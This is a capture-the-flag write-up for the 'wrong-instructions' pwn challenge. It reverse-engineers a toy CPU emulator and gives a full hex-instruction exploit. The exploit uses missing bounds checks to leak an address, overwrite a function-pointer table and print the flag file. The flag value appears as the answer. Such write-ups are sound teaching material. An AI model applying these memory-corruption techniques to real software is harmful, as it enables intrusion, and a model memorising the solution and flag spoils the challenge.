# wrong-instructions

[library.m0unt41n.ch/challenges/wrong-instructions](https://library.m0unt41n.ch/challenges/wrong-instructions) ![](../../resources/pwn.svg) ![](../../resources/medium.svg) 

# TL;DR

We get a simple CPU emulator, that we can control with inputs

# Emulator summary

We are given a binary of a simple CPU emulator, with a reference:

*   **Instructions**
    *   The instruction buffer is `500` instructions long
    *   Each instruction is `9` bytes long
    *   Byte `0` is for `type` (bits `0-3`) and `mode`(bits `4-7`)
    *   Bytes `1-4` are `value1`
    *   Bytes `5-8` are `value2`
*   **Registers**
    *   Register `IP` is the Instruction Pointer
    *   There are 8 general registers for use (`0-7`)
    *   Register `8` is the `OUT` register.
*   **There are 4 additional "config" values**
    *   0 `inMode`
    *   1 `computeMode`
    *   2 `outMode`
    *   3 `silentMode`
*   **Instruction type `0`: `MOV` - sets one value to another**
    *   mode 0: `*value1 = value2`
    *   mode 1: `*value1 = *value2`
    *   mode 2: `*value1 = registers[value2]`
    *   mode 3: `*value1 = *registers[value2]`
    *   mode 4: `registers[value1] = value2`
    *   mode 5: `registers[value1] = *value2`
    *   mode 6: `registers[value1] = registers[value2]`
    *   mode 7: `registers[value1] = *registers[value2]`
*   **Instruction type `1`: `ADD` - adds one value to another**
    *   mode 0: `*value1 += value2`
    *   mode 1: `*value1 += *value2`
    *   mode 2: `*value1 += registers[value2]`
    *   mode 3: `*value1 += *registers[value2]`
    *   mode 4: `registers[value1] += value2`
    *   mode 5: `registers[value1] += *value2`
    *   mode 6: `registers[value1] += registers[value2]`
    *   mode 7: `registers[value1] += *registers[value2]`
*   **Instruction type `2`: `JMP` - changes the Instruction Pointer**
    *   mode 0: `IP = value1`
    *   mode 1: `IP += value1`
*   **Instruction type `3`: `SET` - sets a config value**
    *   mode 0: `config[value1] = value2`
    *   mode 1: `config[value1] = registers[value2]`
*   **Instruction type `4`: `OUT` - writes the value at the address in the `OUT` register to the output stream**
    *   This uses the config value `outMode` to choose between the write function. `mode` is ignored.
    *   `outMode = 0`  writes the value as a hex string.
    *   `outMode = 1`  writes the raw value.
*   **Instruction type `15`: `FINISH` - stops the code**

## Example

Assembly code:
```nasm
MOV 0x690 "Hey\0"
MOV OUT 0x690
OUT
SET outMode 1
OUT
FINISH
```
Binary code
```
00 00000690 00796548   04 00000008 00000690   40 00000000 00000000   30 00000002 00000001   40 00000000 00000000   F0 00000000 00000000
```
Result:
```
$ ./app
Enter emulator instructions as hex, ended by \n
00 00000690 00796548   04 00000008 00000690   40 00000000 00000000   30 00000002 00000001   40 00000000 00000000   F0 00000000 00000000
HEX 0x00796548
RAW Hey
Finished!
```

## Hint

The task description hints that `1337` might play a role here. But we do not get anything beyond that.

# Initial look

Opening the binary in IDA and just casually skimming, we notice some interesting places:

```python
.data:000055CC89A39008 __dso_handle    dq offset __dso_handle
.data:000055CC89A39010 SECRET_FNAME    dd '7331'
.data:000055CC89A39014 aTxt            db '.txt',0
```

```c++
void emulator::sendSecret() {
  FILE *f = fopen(SECRET_FNAME, "r");
  fseek(f, 0, SEEK_END);
  int size = ftell(f);
  char *buf = new char[size];
  rewind(f);
  fread(buf, 1, size, f);
  printf("FILE: %s\n", (const char *)buf);
}
```

```c++
void FUN_00001337(unsigned int arg) {
  *(int *)SECRET_FNAME = arg;
}
```

However, neither of these is called from or otherwise used anywhere in the code.

# The emulator

Let's look a bit closer at the emulator. The binary has all symbols, so it decompiles reasonably well
(with the only annoyance being that it is C++, so, name mangling and some obscure constructs for simple
things like invariants). The, main function is `emulator::runEmulator()` and what it does is roughly:

*   Display the promt and read the code into a string, with some sanity checking
    *   Bail out on empty input
    *   Strip all spaces
*   Call `emulator::parseInstructions(char *inputString)`:
    *   Parse blocks of 9 bytes each, treating them as {char, int, int}
    *   Flip endiannes for both arguments (so that the input can be provided in more natural way)
    *   Put them in `char emulator::buffer[4500]`
*   Put `0` in the `IP` register
*   Iterate with `emulator::stepOnce` which:
    *   Does some sanity checking for `IP` register value
    *   Gets instruction at address pointed by `IP` register from `emulator::buffer[]`
    *   Dispatches the instruction to one of `instrMOV()`, `instrADD()`, `instrJMP()`, `instrSET()`, `instrOUT()`
    *   Does some error checking, bails out on unknown instructions, etc.
    *   Returns 1 if the execution should continue, 0 otherwise.

Note that the actual emulator logic is static, there is no C++-specifics involved, key variables / buffers
are in `.data` or `.bss` segments, etc.

## The registers

They are stored in `int emulator::registers[9]` static array, with the first register being
IP (and not normally accessible). Register #8 (`OUT`) is a separate `registerOut` variable.

Registers are always accessed via `emulator::getRegister` which ensures boundary checking:

```c++
int *emulator::getRegister(int regNum) {
  if ( (regNum >= 0) && (regNum <= 7 ) )
    return (int*)&emulator::registers[regNum + 1];
  if ( regNum == 8 )
    return (int*)&registerOut;
  return NULL;
}
```

(returns pointer to a validated register `regNum`, otherwise `NULL`)

## MOV instruction

It is pretty generic sequence of cases, taking into account different addressing modes.

For addressing modes that write to memory (`0..3`), it does boundary checking, ensuring that the
destination address is within `emulator::buffer[]`.
However, the **second argument is not range-checked**, which allows arbitrary reads!

```c++
// Note that it is always called with d==4
bool emulator::isInBuffer(unsigned int addr, unsigned int d) {
  return addr <= 4500 - d;
}

int emulator::instrMOV(char *ptr) {
  unsigned char mode = ((unsigned char*)*ptr) & 0xF;
  if ( mode >7 ) return 0;
  if ( mode >=4 ) {
    unsigned int *reg1Ptr = emulator::getRegister((emulator *)*(unsigned int*)(ptr + 1));
    switch ( mode ) {
      case 7:  // registers[val1] = *registers[val2]
        *reg1Ptr = *(unsigned int*)&emulator::buffer[*emulator::getRegister((emulator *)*(unsigned int*)(ptr + 5))];
      case 6:  // registers[val1] = registers[val2]
        *reg1Ptr = *emulator::getRegister((emulator *)*(unsigned int*)(ptr + 5));
      case 5:  // registers[val1] = *val2
        *reg1Ptr = *(unsigned int*)&emulator::buffer[*(unsigned int*)(ptr + 5)];
      case 4:  // registers[val1] = *val2
        *reg1Ptr = *(unsigned int*)((char*)ptr + 5);
    }
  } else {
    unsigned int val1 = *(unsigned int*)(ptr + 1);
    if ( !emulator::isInBuffer(val1, 4) ) return 0;
    unsigned int *val1Ptr = (unsigned int*)&emulator::buffer[val1];
    switch ( mode ) {
      case 3:  // *val1 = *registers[val2]
        *val1Ptr = *(unsigned int*)&emulator::buffer[*emulator::getRegister((emulator *)*(unsigned int*)(ptr + 5))];
      case 2:  // *val1 = registers[val2]
        *val1Ptr = *emulator::getRegister((emulator *)*(unsigned int*)(ptr + 5));
      case 1:  // *val1 = *val2
        *val1Ptr = *(unsigned int*)&emulator::buffer[*(unsigned int*)(ptr + 5)];
      case 0:  // *val1 = val2
        *val1Ptr = *(unsigned int*)(ptr + 5);
    }
  }
  return 1;
}
```

(Note: here and above the decompiled code has been significantly rewritten for readability)

## ADD instruction

Very similar to above `MOV`, with similar addressing modes and `isInBuffer()` protection for the first argument.
We skip the decompilation for brevity, as we will only need it for the simplest, immediate form (add value to register).

## SET instruction

```c++
int emulator::config[4];
int emulator::instrSET(char *ptr) {
  unsigned char mode = (*(unsigned *)ptr) & 0xF;
  if ( mode > 1 ) return 0;
  unsigned int addr = *(unsigned int *)(ptr + 1);
  if ( &emulator::config[addr] > (unsigned int*)&_dso_handle + 1 && &emulator::config[addr] < (unsigned int*)aTxt )
    return 0;
  if ( mode == 1 )
    emulator::config[addr] = *emulator::getRegister((emulator *)*(unsigned int *)(ptr + 5));
  else
    emulator::config[addr] = *(unsigned int *)(ptr + 5);
  return 1LL;
}
```

The `SET` instruction also has some boundary checking but... a weird one. It seems not to be protecting the
area outside of `config[]`, but rather... the `SECRET_FNAME` area we identified above! And other than that,
**it allows arbitrary writes** by using any "config" values (incl. negative ones). The only constraint is that
the target addresses have to be at boundary of 4, as `config` entries are 32-bit.

## OUT instruction

Just as specified, it calls one of `outHEX()` or `outRAW()`, depending on the `outMode`

```c++
int emulator::outHEX(char *ptr) {
  return printf("HEX 0x%08X\n", *(unsigned int *)&emulator::buffer[(unsigned int)ptr]);
}
int emulator::outRAW(char *ptr) {
  return printf("RAW %s\n", &emulator::buffer[(unsigned int)ptr]);
}
void *outFuncs[2] = { &emulator::outHEX, &emulator::outRAW };

int emulator::instrOUT(char *ptr)
{
  ((void (emulator *))emulator::outFuncs[outMode])((unsigned int *)registerOut);
  return 1;
}
```

Note that, in `outFuncs[outMode])`, **the index is not checked either**.

# Summary of vulnerabilities

So, we have:

*   Arbitrary read with `MOV` (second argument does not do boundary checks)
*   Arbitrary write with `SET`, except for `SECRET_FNAME` area and limited to aligned 32-bit writes.
*   We can write to `SECRET_FNAME` too, if we manage to call `FUN_00001337()` - the `unsigned int`
    argument will then overwrite first four bytes of `SECRET_FNAME`.
*   `instrOut()` can potentially call any address through an indirect pointer. We will not need
    this one though.

# How all this look like in memory

Let's recap the most interesting addresses that we can use for exploitation. Note that ASLR is in use,
so the actual addresses in RAM will differ every time. However:

*   Last 12 bits (page offset) should be the same
*   Differences between addresses should be the same

```nasm
.text:000055E6893EC4D0  FUN_00001337(int32 arg) {...};
.text:000055E6893EC4E7  emulator::sendSecret() {...};
.text:000055E6893EC59C  emulator::outRAW() {...};
.text:000055E6893EC5D2  emulator::outHEX() {...};
.data:000055E6893F0010  char SECRET_FNAME[4]='7331';
.data:000055E6893F0014  char aTxt[5]='.txt\0';
.data:000055E6893F0020  int64 emulator::outFuncs[2] = {
                          0x000055E6893EC5D2,  // &emulator::outHEX
                          0x000055E6893EC59C   // &emulator::outRAW
                        };
.bss:000055E6893F0160   char emulator::buffer[500*9];
.bss:000055E6893F1300   int32 emulator::registers[9];
.bss:000055E6893F1324   int32 registerOut;
.bss:000055E6893F1330   int32 emulator::config[4];
.bss:000055E6893F1338   int32 outMode;
```

# The attack

Overall idea of the attack:

*   Calculate addresses of `FUN_00001337()` and `sendSecret()`, by reading address of `emulator::outHex()`
    from `outFuncs[]` and subtracting the delta.
*   Overwrite `outFuncs[]` with these addresses.
*   Now, by setting `outMode` to `0` or `1`, we can call these functions with `OUT` instruction,
    passing arguments in the `OUT` register.

All that can be done with:

```nasm
05 00000000 FFFFFEC0   MOV R0,[0xFFFFFEC0]  ; load lower 32 bits of outHEX() address into R0
                                            ; (0x893F0020 - 0x893F0160 == 0xFFFFFEC0)
14 00000000 FFFFFF15   ADD R0,0xFFFFFF15    ; update R0 to point sendSecret() instead
                                            ; (0x893EC4E7 - 0x893EC5D2 == 0xFFFFFF15)
31 FFFFFB3C 00000000   SET FFFFFB3C,R0      ; update outFuncs[0] to point to sendSecret()
                                            ; (0x893F0020 - 0x893F1330) / 4 = 0xFFFFFB3C
14 00000000 FFFFFFE9   ADD R0,FFFFFFE9      ; update R0 to point to FUN_00001337() instead
                                            ; (0x893EC4D0 - 0x893EC4E7) = 0xFFFFFFE9
31 FFFFFB3E 00000000   SET FFFFFB3E,R0      ; update outFuncs[1] to point to FUN_00001337()
                                            ; (0xFFFFFB3E, because config[] is int32 array, we need to step one int64 forward)
```

## Getting 1337.txt

With all that prep, we can try to get the `1337.txt` file which is encoded in the emulator:

```nasm
30 00000002 00000000   SET 2,0              ; set hex mode. OUT will call sendSecret()
40 00000000 00000000   OUT                  ; call sendSecret() - will read and print SECRET_FNAME
F0 00000000 00000000   FINISH
```

Result

```
$ ./app
Enter emulator instructions as hex, ended by \n
05 00000000 FFFFFEC0 14 00000000 FFFFFF15 31 FFFFFB3C 00000000 14 00000000 FFFFFFE9 31 FFFFFB3E 00000000 30 00000002 00000000 40 00000000 00000000 F0 00000000 00000000
```
... but, what follows is:

![](rickroll.webp "")

 No flag though &#128578;

## Getting flag.txt

Let's take an educated guess that the needed file is actually `flag.txt` - and use the `FUN00001337()` to make `sendSecret()` give it to us.

```nasm
30 00000002 00000001   SET 2,1              ; OUT will now call FUN_00001337
04 00000008 67616C66   MOV OUT,67616C66     ; Set OUT register to contain 'galf'
40 00000000 00000000   OUT                  ; call FUN_00001337 - will update SECRET_FNAME to 'flag'
30 00000002 00000000   SET 2,0              ; set hex mode. OUT will call sendSecret()
40 00000000 00000000   OUT                  ; call sendSecret() - will read and print SECRET_FNAME
F0 00000000 00000000   FINISH
```

Result:

```
$ ./app 
Enter emulator instructions as hex, ended by \n
05 00000000 FFFFFEC0 14 00000000 FFFFFF15 31 FFFFFB3C 00000000 14 00000000 FFFFFFE9 31 FFFFFB3E 00000000 30 00000002 00000001 04 00000008 67616C66 40 00000000 00000000 30 00000002 00000000 40 00000000 00000000 F0 00000000 00000000
FILE: shc2024{wh0_n33ds_b0unds_ch3cks}

Finished!
```

---

## `shc2024{wh0_n33ds_b0unds_ch3cks}`


<hr>

&copy; [muflon77](https://library.m0unt41n.ch/players/805ae1c8-9fe4-5816-b4a4-5057fa6eedb1)
